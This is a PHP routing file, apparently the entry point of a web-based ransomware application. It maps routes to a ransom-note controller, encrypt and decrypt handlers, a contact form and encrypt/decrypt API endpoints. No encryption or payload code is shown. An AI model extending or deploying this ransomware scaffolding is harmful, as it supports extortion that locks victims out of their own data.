<?php
require_once __DIR__ . '/../vendor/autoload.php';

use App\Core\Router;
use App\Core\ConfigManager;
use App\Core\Logger;

// Initialize application
Logger::initialize();

$router = new Router();

// Define routes
$router->add('GET', '/', 'RansomController@showNote');
$router->add('GET', '/encrypt', 'EncryptionController@index');
$router->add('POST', '/encrypt', 'EncryptionController@index');
$router->add('GET', '/decrypt', 'DecryptionController@index');
$router->add('POST', '/decrypt', 'DecryptionController@index');
$router->add('GET', '/contact', 'RansomController@contact');
$router->add('POST', '/contact', 'RansomController@contact');

// API routes
$router->add('POST', '/api/encrypt', 'EncryptionController@apiEncrypt');
$router->add('POST', '/api/decrypt', 'DecryptionController@apiDecrypt');

// Dispatch the request
$router->dispatch();